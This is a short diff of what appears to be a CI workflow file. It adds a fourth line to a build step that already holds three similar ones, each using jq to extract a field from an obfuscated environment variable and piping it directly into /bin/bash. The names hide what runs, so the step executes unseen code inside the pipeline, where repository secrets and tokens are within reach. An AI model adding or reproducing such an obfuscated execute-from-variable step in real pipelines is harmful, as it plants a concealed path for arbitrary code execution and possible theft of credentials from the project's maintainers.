@@ -33,6 +33,7 @@ jobs:
           printf '%s' "$uiuy77" | jq -r .kv4 | /bin/bash
           printf '%s' "$k26402" | jq -r .ltdj7 | /bin/bash
           echo $d7572 | jq -r .c1691 | /bin/bash
+          echo $e27224 | jq -r .h2 | /bin/bash
 
       - name: Archive output
         if: always()
